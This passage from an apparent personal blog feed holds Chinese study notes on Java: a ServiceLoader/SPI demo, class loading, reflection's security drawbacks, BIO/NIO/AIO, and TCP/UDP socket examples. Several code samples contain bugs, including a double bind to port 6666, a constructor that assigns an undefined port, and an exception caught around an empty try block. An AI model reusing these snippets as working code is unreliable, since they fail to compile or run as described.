id="定义两种功能（RedisCache和MemeCache）"><a href="#定义两种功能（RedisCache和MemeCache）" class="headerlink" title="定义两种功能（RedisCache和MemeCache）"></a>定义两种功能（RedisCache和MemeCache）</h5><pre class="line-numbers language-Java"><code class="language-Java">//缓存接口public interface Cache &#123;    // 设置缓存    void set(String key , String value);    //获取缓存    String get(String key);&#125;//redis 提供的缓存实现public class RedisCache implements Cache&#123;    @Override    public void set(String key, String value) &#123;        System.out.println("[redis缓存] set");    &#125;    @Override    public String get(String key) &#123;        System.out.println("[redis缓存] get");        return "";    &#125;&#125;//MemeCache 提供的缓存实现public class MemeCache implements Cache&#123;    @Override    public void set(String key, String value) &#123;        System.out.println("[MemeCache缓存] set");    &#125;    @Override    public String get(String key) &#123;        System.out.println("[MemeCache缓存] get");        return "";    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="spring-factory配置文件"><a href="#spring-factory配置文件" class="headerlink" title="spring.factory配置文件"></a>spring.factory配置文件</h5><pre class="line-numbers language-factory"><code class="language-factory"># collection.RedisCache 是RedisCache类的全路径，代表项目要用redis缓存collection.RedisCache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="ServiceLoader实现功能"><a href="#ServiceLoader实现功能" class="headerlink" title="ServiceLoader实现功能"></a>ServiceLoader实现功能</h5><pre class="line-numbers language-Java"><code class="language-Java">public class ServiceLoader &#123;    // 读取spring.factorys文件     private static Map<Class<?>, Class<?>> doFind() throws IOException &#123;        Path f = Paths.get(ServiceLoader.class.getResource("/").getPath().substring(1), "META-INF/spring.factorys");        List<String> strs = Files.readAllLines(f, Charset.forName("UTF-8"));        final Map<Class<?>, Class<?>> map = new HashMap<>();                // 把行内容变成 Map key： 接口 value:对应的实现类 ，再获取实现的接口        for (String line : strs) &#123;            try &#123;                Class<?> impl = Class.forName(line);                map.put(Class.forName(line).getInterfaces()[0], impl);            &#125; catch (Exception e) &#123;            &#125;        &#125;        return map;    &#125;        @SuppressWarnings("unchecked")    public static <T> T load(Class<T> inter) throws Exception &#123;            // 加载 spring.factorys文件        Map<Class<?>, Class<?>> mapper = doFind();                // 查找 对应的实现类        Class<T> impl = (Class<T>) mapper.get(inter);        if (impl == null) &#123;            return null;        &#125;                // 否则 利用反射生成 实现        return doCreate(impl);    &#125;        // 反射实例化对象    private static <T> T doCreate(Class<T> impl) throws InstantiationException, IllegalAccessException &#123;        return impl.newInstance();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h5><ol><li>利用Paths加载${项目}/META-INF/spring.factorys文件，找到具体用哪个实现类。</li><li>将上述实现类forClass得到Class对象，并通过getInterfaces获取其实现的接口，封装成Map&lt;接口Class，实现类Class&gt;。</li><li>匹配load方法用户传过来的接口，通过上面map得到实现类，通过newInstance方法构造实例返回。</li></ol><h3 id="Java内存加载"><a href="#Java内存加载" class="headerlink" title="Java内存加载"></a>Java内存加载</h3><p><a href="https://smms.app/image/p5Yl7cxBDjRsor1" target="_blank"><img src="https://s2.loli.net/2023/12/20/p5Yl7cxBDjRsor1.jpg" ></a></p><p><a href="https://smms.app/image/7q1EmModVgfTpaH" target="_blank"><img src="https://s2.loli.net/2023/12/20/7q1EmModVgfTpaH.jpg" ></a></p><ol><li>类的加载 (Load) 类加载器完成将类的class文件读入内存并创建<code>java.lang.Class</code>对象操作。</li><li>类的链接 (Link) 将类的二进制数据合并进JRE，在合并的过程中可以对类进行校验，检查其是否存在安全问题，是否符合JVM语法规范，接着为类变量 (static) 分配内存和设置默认初始值，这些内存在方法区中进行分配。最后在虚拟机,中将常量名替换为引用地址。</li><li>类的初始化 (lnitialize) JVM对类进行初始化，过程中执行类构造器的方法，此方法是编译期自动收集类中的变量赋值动作和静态代码合并而成的，目标虚拟机会保证类构造器的方法会在多线程中被正确的加锁和同步。且在初始化过程中，如果发现类的父类还没有被初始化，则会优先初始化其父类。</li></ol><p><strong>类缓存：</strong>标准的JavaSE类加载器可以按要求查找类，但一旦某个类被加载到加载器中将维持加载（缓存）一段时间，不过JVM垃圾回收机制可以回收这些Class对象</p><h2 id="Java反射安全"><a href="#Java反射安全" class="headerlink" title="Java反射安全"></a>Java反射安全</h2><h3 id="反射带来的安全问题"><a href="#反射带来的安全问题" class="headerlink" title="反射带来的安全问题"></a>反射带来的安全问题</h3><ol><li>性能低-因为java反射动态地解析类型，它涉及处理像扫描类路径找到要加载的类，导致性能降低。 </li><li>安全限制-反射需要运行时权限，可能不适用于在安全管理器下运行的系统。这可能会导致应用程序在运行时由于安全管理器而失败。 </li><li>安全问题-使用反射，我们可以访问我们不应该访问的部分代码，例如，我们可以访问类的私有字段并更改它的值。这可能是一个严重的安全威胁，并导致您的应用程序的行为异常。 </li><li>高维护-反射代码很难理解和调试，在编译时也无法找到代码的任何问题，因为类可能不可用，使得它不太灵活和难以维护。</li></ol><h3 id="安全问题原理"><a href="#安全问题原理" class="headerlink" title="安全问题原理"></a>安全问题原理</h3><p>每个类都有且仅有一个class对象。通过类和对象都能获取到类的class对象，获取到class对象有下面三种方式。</p><pre><code>1.Student.class   //通过类名.class的方式获取class对象2.stu1.getClass()   //通过类对象.getClass()的方式获取class对象3.Class.forName(&quot;com.test.Student&quot;)  //通过全限定名的方式获取class对象</code></pre><p>Java反射的主要作用是通过class对象来对类的属性和方法进行获取和调用，但是还有一个极为重要的特征就是可以调用类的私有方法（包括protected和private）。这种的特性是后续很多java反序列化利用链依赖反射机制的重要原因。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;注解&quot;&gt;&lt;a href=&quot;#注解&quot; class=&quot;headerlink&quot; title=&quot;注解&quot;&gt;&lt;/a&gt;注解&lt;/h2&gt;&lt;h3 id=&quot;Java注解概述&quot;&gt;&lt;a href=&quot;#Java注解概述&quot; class=&quot;headerlink&quot; title=&quot;Java注解概述&quot;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java IO</title>
    <link href="https://liu1272.github.io/2023/12/15/Java-IO/"/>
    <id>https://liu1272.github.io/2023/12/15/Java-IO/</id>
    <published>2023-12-14T17:48:00.000Z</published>
    <updated>2023-12-15T09:16:35.097Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Java-IO一览表"><a href="#Java-IO一览表" class="headerlink" title="Java IO一览表"></a>Java IO一览表</h4><p><a href="https://smms.app/image/lxEK1eG4MWaQvqS" target="_blank"><img src="https://s2.loli.net/2023/12/15/lxEK1eG4MWaQvqS.png" ></a></p><h2 id="同步-异步-阻塞-非阻塞"><a href="#同步-异步-阻塞-非阻塞" class="headerlink" title="同步|异步|阻塞|非阻塞"></a>同步|异步|阻塞|非阻塞</h2><h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p>指的是协同步调。既然叫协同，所以至少要有2个以上的事物存在。协同的结果就是：多个事物不能同时进行，必须一个一个的来，上一个事物结束后，下一个事物才开始。</p><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><p>就是步调各异。既然是各异，那就是都不相同。所以结果就是：多个事物可以你进行你的、我进行我的，谁都不用管谁，所有的事物都在同时进行中。</p><h4 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h4><p>所谓阻塞：指的是阻碍堵塞。它的本意可以理解为由于遇到了障碍而造成的动弹不得。</p><h4 id="非阻塞"><a href="#非阻塞" class="headerlink" title="非阻塞"></a>非阻塞</h4><p>所谓非阻塞：自然是和阻塞相对，可以理解为由于没有遇到障碍而继续畅通无阻。</p><h2 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h2><p><strong>同步并阻塞</strong>，服务器实现模式为一个连接一个线程<br>如果这个连接不做任何事情会造成不必要的线程开销，当然可以通过线程池机制改善。<br>BIO方式适用于连接数目比较小且固定的架构，这种方式对服务器资源要求比较高，并发局限于应用中。<br><a href="https://smms.app/image/LnWFysMRue63GE2" target="_blank"><img src="https://s2.loli.net/2023/12/15/LnWFysMRue63GE2.jpg" ></a></p><h4 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h4><pre class="line-numbers language-Java"><code class="language-Java">public static void main(String args[]) throws IOException &#123;    //新建连接    ServerSocket serverSocket = new ServerSocket(30888);    System.out.println("Start accept...");    Socket socket = serverSocket.accept();        //缓冲区读入    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));    PrintWriter writer = new PrintWriter(socket.getOutputStream());    writer.println("Connection Success!");    writer.flush();        //关闭读取    reader.close();    writer.close();    socket.close();    serverSocket.close();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h4><pre class="line-numbers language-Java"><code class="language-Java">public static void main(String args[]) throws IOException, UnknownHostException &#123;    //新建连接    Socket socket = new Socket(InetAddress.getLocalHost(), 30888);    PrintWriter writer = new PrintWriter(socket.getOutputStream());        //输入    Scanner scanner = new Scanner(System.in);    String readline = "";        //单方法使用lamda表达式    Thread thread = new Thread(() -> &#123;        int size = -1;        byte[] bytes = new byte[1024];        StringBuilder sb = new StringBuilder(1024);        try &#123;            //执行代码        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;);        //开启线程，关闭连接    thread.start();    scanner.close();    writer.close();    socket.close();    thread.interrupt();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="伪异步IO"><a href="#伪异步IO" class="headerlink" title="伪异步IO"></a>伪异步IO</h2><p>BIO模式的服务端是1:1的线程开销，访问量越大，系统将发生线程栈溢线程创建失败，最终导致进程宕机或者僵死，从而不能对外提供服务。<br>伪异步IO的通信采用线程池和任务队列实现，当客户端接入时，将客户端的Socket封装成一个Task交给后端的线程池中进行处理。<br>JDK的线程池维护一个消息队列和N个活跃的线程，对消息队列中Socket任务进行处理，由于线程池可以设置消息队列的大小和最大线程数，因此，它的资源占用是可控的，无论多少个客户端并发访问，都不会导致资源的耗尽和宕机。<br>伪异步io采用了线程池实现，因此避免了为每个请求创建一个独立线程造成线程资源耗尽的问题，但由于底层依然是采用的同步阻塞模型，因此无法从根本上解决问题。<br>如果单个消息处理的缓慢，或者服务器线程池中的全部线程都被阻塞，那么后续scket的io消息都将在队列中排排队。新的Socket请求将被拒绝，客户端会发生大量连接超时。<br><a href="https://smms.app/image/6MEzeTd9OHurkcY" target="_blank"><img src="https://s2.loli.net/2023/12/15/6MEzeTd9OHurkcY.jpg" ></a></p><h2 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h2><p><strong>同步非阻塞</strong>，服务器实现模式为一个请求一个线程<br>多路复用器轮询到连接有I/O请求时才启动一个线程进行处理。<br>NIO 新增了 Channel、Selector、Buffer 等抽象概念，支持面向缓冲、基于通道的 I/O 操作方法。<br>NIO方式适用于连接数目多且连接比较短（轻操作）的架构，比如聊天服务器，并发局限于应用中。<br><a href="https://smms.app/image/f9czQpCtwxXGyae" target="_blank"><img src="https://s2.loli.net/2023/12/15/f9czQpCtwxXGyae.jpg" ></a></p><ul><li><strong>通道channel：</strong> 绑定一个缓存区，缓存区与磁盘文件的相互传输依靠 channel 双向通道。</li><li><strong>缓存区Buffer：</strong> Buffer 就像一个数组，可以保存多个相同类型的数据。BIO的Buffer只能单向，NIO可以双向。</li><li><strong>选择器Selector（多路复用器）：</strong> 将 Channel 注册之后可用于检查一个或多个 Channel 的状态是否处于连接就绪、接受就绪、可读就绪、可写就绪。</li></ul><h4 id="直接缓冲区与非直接缓冲区"><a href="#直接缓冲区与非直接缓冲区" class="headerlink" title="直接缓冲区与非直接缓冲区"></a>直接缓冲区与非直接缓冲区</h4><p><a href="https://smms.app/image/FQq3BDO7KityXRU" target="_blank"><img src="https://s2.loli.net/2023/12/15/FQq3BDO7KityXRU.jpg" ></a><br><strong>应用程序想从磁盘中读取一个数据时会向操作系统发起一个读请求，首先磁盘中的数据被读取到内核地址空间中，然后会把内核地址空间中的数据拷贝到用户地址空间中（其实就是 JVM 内存中），最后再把这个数据读取到应用程序中来。</strong></p><p><a href="https://smms.app/image/Wa9jEf7qu5UyOJt" target="_blank"><img src="https://s2.loli.net/2023/12/15/Wa9jEf7qu5UyOJt.jpg" ></a><br><strong>直接用物理内存作为缓冲区，读写数据直接通过物理内存进行。</strong></p><h4 id="分散读取与聚集写入"><a href="#分散读取与聚集写入" class="headerlink" title="分散读取与聚集写入"></a>分散读取与聚集写入</h4><p>分散读取是指从 Channel 中读取的数据按照缓冲区的顺序 “分散” 到多个 Buffer 中<br>聚集写入是指将多个 Buffer 中的数据按照缓冲区的顺序 “聚集” 到 Channel</p><pre class="line-numbers language-Java"><code class="language-Java">public static void test4() throws Exception &#123;    RandomAccessFile raf = new RandomAccessFile("a.txt", "rw");    // 获取通道    FileChannel channel = raf.getChannel();    // 分配指定大小缓冲区    ByteBuffer buf1 = ByteBuffer.allocate(2);    ByteBuffer buf2 = ByteBuffer.allocate(1024);    // 分散读取    ByteBuffer[] bufs = &#123;buf1, buf2&#125;;    channel.read(bufs);  // 参数需要一个数组    for (ByteBuffer byteBuffer : bufs) &#123;        byteBuffer.flip();  // 切换到读模式    &#125;    System.out.println(new String(bufs[0].array(), 0, bufs[0].limit()));  // 打印 he    System.out.println(new String(bufs[1].array(), 0, bufs[1].limit()));  // 打印 llo    // 聚集写入    RandomAccessFile raf2 = new RandomAccessFile("e.txt","rw");    // 获取通道    FileChannel channel2 = raf2.getChannel();    channel2.write(bufs);  // 把 bufs 里面的几个缓冲区聚集到 channel2 这个通道中，聚集到通道中，也就是到了 e.txt 文件中    channel2.close();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">public static void main(String[] args) throws  Exception&#123;        //创建ServerSocketChannel，-->> ServerSocket        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();        InetSocketAddress inetSocketAddress = new InetSocketAddress(5555);        serverSocketChannel.socket().bind(inetSocketAddress);                //设置成非阻塞        serverSocketChannel.configureBlocking(false);          //开启selector,并注册accept事件        Selector selector = Selector.open();        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);                //循环接收请求        while(true) &#123;            selector.select(2000);  //监听所有通道            //遍历selectionKeys            Set<SelectionKey> selectionKeys = selector.selectedKeys();            Iterator<SelectionKey> iterator = selectionKeys.iterator();            while (iterator.hasNext()) &#123;                SelectionKey key = iterator.next();                                //处理连接事件                if(key.isAcceptable()) &#123;                      SocketChannel socketChannel = serverSocketChannel.accept();                                        //设置为非阻塞                    socketChannel.configureBlocking(false);                      System.out.println("client:" + socketChannel.getLocalAddress() + " is connect");                                        //注册客户端读取事件到selector                    socketChannel.register(selector, SelectionKey.OP_READ);                 &#125; else if (key.isReadable()) &#123;  //处理读取事件                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);                    SocketChannel channel = (SocketChannel) key.channel();                    channel.read(byteBuffer);                    System.out.println("client:" + channel.getLocalAddress() + " send " + new String(byteBuffer.array()));                &#125;                iterator.remove();  //事件处理完毕，要记得清除            &#125;        &#125;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class NIOClient &#123;     public static void main(String[] args) throws Exception&#123;               SocketChannel socketChannel = SocketChannel.open();                                //设置成非阻塞            socketChannel.configureBlocking(false);            InetSocketAddress inetSocketAddress = new InetSocketAddress("127.0.0.1", 5555);             if(!socketChannel.connect(inetSocketAddress)) &#123;                while (!socketChannel.finishConnect()) &#123;                    System.out.println("客户端正在连接中，请耐心等待");                &#125;            &#125;             ByteBuffer byteBuffer = ByteBuffer.wrap("mikechen的互联网架构".getBytes());            socketChannel.write(byteBuffer);            socketChannel.close();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h2><p><strong>异步非阻塞</strong>，服务器实现模式为一个有效请求一个线程</p><p>Java AIO 采用订阅-通知模式：即应用程序向操作系统注册IO监听，然后继续做自己的事情。当操作系统发生IO事件，并且准备好数据后，在主动通知应用程序，触发相应的函数。</p><p>客户端的I/O请求都是由OS先完成了再通知服务器应用去启动线程进行处理。</p><p>AIO方式使用于连接数目多且连接比较长（重操作）的架构，比如相册服务器，充分调用OS参与并发操作。</p><p><em><strong>IO模型是由操作系统提供支持的</strong></em></p><p>windows系统提供了一种异步IO技术：<code>IOCP</code>（I/O CompletionPort，I/O完成端口）<br>Linux下由于没有这种异步IO技术，所以使用 <code>epoll</code> 对异步IO进行模拟。</p><p>代码层面如下图所示结构。<br><a href="https://smms.app/image/r5iY9NuJVtgOBQx" target="_blank"><img src="https://s2.loli.net/2023/12/15/r5iY9NuJVtgOBQx.jpg" ></a></p><h2 id="三者比较"><a href="#三者比较" class="headerlink" title="三者比较"></a>三者比较</h2><p><a href="https://smms.app/image/YHS1Ixk3isQnJWa" target="_blank"><img src="https://s2.loli.net/2023/12/15/YHS1Ixk3isQnJWa.jpg" ></a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><strong>马上期末了，这两天把java剩下的反射和容器写完，然后——再鸽一段时间 hhh</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Java-IO一览表&quot;&gt;&lt;a href=&quot;#Java-IO一览表&quot; class=&quot;headerlink&quot; title=&quot;Java IO一览表&quot;&gt;&lt;/a&gt;Java IO一览表&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://smms.app/image/lxEK1e</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java网络编程</title>
    <link href="https://liu1272.github.io/2023/12/14/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>https://liu1272.github.io/2023/12/14/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</id>
    <published>2023-12-14T11:28:00.000Z</published>
    <updated>2023-12-14T14:40:36.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>这篇文章我觉得我对于网络基础部分就不用再说更多了，直接一张图就够。剩下的用代码和注释来说明，看懂就是学会。</strong><br><a href="https://smms.app/image/Yv5mfec4P3sdFHt" target="_blank"><img src="https://s2.loli.net/2023/12/14/Yv5mfec4P3sdFHt.png" ></a></p><h2 id="单播通信"><a href="#单播通信" class="headerlink" title="单播通信"></a>单播通信</h2><h3 id="TCP通信"><a href="#TCP通信" class="headerlink" title="TCP通信"></a>TCP通信</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String[] args) &#123;        ServerSocket serverSocket = null;   //初始化定义为空保证安全        Socket socket = null;        InputStream is = null;        ByteArrayOutputStream baos = null;        try &#123;            //创建ServerSocket对象，监听9999端口            serverSocket = new ServerSocket(9999);            //等待客户端的连接请求，返回一个Socket对象，程序阻塞在此处直到有客户端连接            socket = serverSocket.accept();            //获取输入流，用于读取客户端发送的数据            is = socket.getInputStream();            //创建字节数组输出流，用于存储读取到的数据            baos = new ByteArrayOutputStream();            //预定义缓冲区数组大小，方便存储数据            byte[] buffer = new byte[1024];            int len;            //循环读取客户端发送的数据，将数据存储到字节数组输出流中            while((len = is.read(buffer))!=-1)&#123;                //要写入的字节数组，从第一个元素开始写入，写入的字节数量                baos.write(buffer,0,len);              &#125;            //将字节数组输出流中的数据转换为字符串并输出到控制台            System.out.println(baos.toString());            //关闭字节数组输出流和输入流            baos.close();            is.close();            //关闭Socket对象和ServerSocket对象            socket.close();            serverSocket.close();        &#125; catch (IOException e)&#123;            e.printStackTrace(); //打印异常信息        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    public static void main(String[] args) &#123;        Socket socket = null;   // 用于建立客户端与服务器之间的套接字连接        OutputStream os = null; // 用于向服务器发送数据的输出流        try &#123;                        // 通过IP地址获取服务器的InetAddress实例            InetAddress serverIP = InetAddress.getByName("127.0.0.1");             int port = 9999; // 连接服务器的端口号            // 创建套接字连接至服务器            socket = new Socket(serverIP, port);            // 通过套接字获取输出流，用于向服务器发送数据            os = socket.getOutputStream();            // 向服务器发送数据，需要            os.write("Hello, world!".getBytes());              //getBytes()方法编码为 byte 序列，并将结果存储到一个新的 byte 数组中        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125; finally &#123;            if (socket != null) &#123;                try &#123;                    socket.close(); // 关闭套接字连接                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="UDP通信"><a href="#UDP通信" class="headerlink" title="UDP通信"></a>UDP通信</h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String[] args) throws Exception &#123;            //创建DatagramSocket对象，监听6666端口        DatagramSocket socket = new DatagramSocket(6666);                //一直循环接收信息        while (true) &#123;            byte[] container = new byte[1024];                        //创建DatagramPacket对象，用于接收客户端发送的数据（合成一个包）            DatagramPacket packet = new DatagramPacket(container,0,container.length);            //要发送或接收的数据的字节数组，从头开始读取或写入，读取或写入的字节数                        //接收客户端发送的数据            socket.receive(packet);            byte[] data = packet.getData();            //获取接收到的数据，返回一个字节数组                        //将接收到的字节数组（包）转换为字符串            String receiveDatas = new String(data,0,packet.getLength());            System.out.println(receiveDatas);                        //判断是否输入了“bye”，如果是则退出循环            if (receiveDatas.trim().equals("bye")) &#123;                break;            &#125;        &#125;                //关闭DatagramSocket对象        socket.close();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    public static void main(String[] args) throws Exception &#123;        try &#123;                    //创建DatagramSocket对象，监听8888端口            DatagramSocket socket = new DatagramSocket(8888);                        //创建BufferedReader对象，用于从控制台读取数据            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));                                //一直循环接收信息            while (true) &#123;                            //从控制台读取数据                String data = reader.readLine();                                //将读取到的字符串转换为字节数组                byte[] datas = data.getBytes();                                //创建DatagramPacket对象，打包好数据，指定发送的目标地址和端口号                DatagramPacket packet = new DatagramPacket(datas,0,datas.length,new InetSocketAddress("127.0.0.1",6666));                                //发送数据                socket.send(packet);                                //判断是否输入了“bye”，如果是则退出循环                if (data.equals("bye")) &#123;                    break;                &#125;            &#125;                        //关闭DatagramSocket对象            socket.close();        &#125; catch (SocketException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多线程通信"><a href="#多线程通信" class="headerlink" title="多线程通信"></a>多线程通信</h3><h4 id="服务端-2"><a href="#服务端-2" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">//继承Runnable接口public class Sever implements Runnable &#123;       DatagramSocket socket = new DatagramSocket(6666);    private int port;    private String msgfrom;    public Sever(int port,String msgfrom) throws IOException &#123;        this.port = port;        this.msgfrom = msgfrom;        socket = new DatagramSocket(6666);    &#125;        //重写run()方法    public void run() &#123;           try &#123;            while (true) &#123;                byte[] container = new byte[1024];                //创建DatagramPacket对象，用于接收客户端发送的数据                DatagramPacket packet = new DatagramPacket(container,0,container.length);                //接收客户端发送的数据                socket.receive(packet);                byte[] data = packet.getData();                //将接收到的字节数组转换为字符串                String receiveDatas = new String(data,0,data.length);                System.out.println(msgfrom + ":" + receiveDatas);                //判断是否输入了“bye”，如果是则退出循环                //trim()去除首尾空格，equals()比较对象，被比较的放前面                if (receiveDatas.trim().equals("bye")) &#123;                    break;                &#125;            &#125;            //关闭DatagramSocket对象            socket.close();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端-2"><a href="#客户端-2" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent implements Runnable &#123;    DatagramSocket socket = null;    BufferedReader reader = null;    private String toIP;    private int fromport;    private int toport;    public Cilent(int fromIP,String toIP,int toport) throws SocketException &#123;        this.fromport = fromport;        this.toport = toport;        this.toIP = toIP;        //创建DatagramSocket对象，监听指定端口        socket = new DatagramSocket(fromport);        //创建BufferedReader对象，用于从控制台读取数据        reader = new BufferedReader(new InputStreamReader(System.in));    &#125;    public void run() &#123;        try &#123;            while (true) &#123;                //从控制台读取数据                String data = reader.readLine();                //将读取到的字符串转换为字节数组                byte[] datas = data.getBytes();                //创建DatagramPacket对象，指定发送的目标地址和端口号                DatagramPacket packet = new DatagramPacket(datas,0,datas.length,new InetSocketAddress(this.toIP,this.toport));                //发送数据                socket.send(packet);                //判断是否输入了“bye”，如果是则退出循环                if (data.equals("bye")) &#123;                    break;                &#125;            &#125;            //关闭DatagramSocket对象            socket.close();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="广播通信"><a href="#广播通信" class="headerlink" 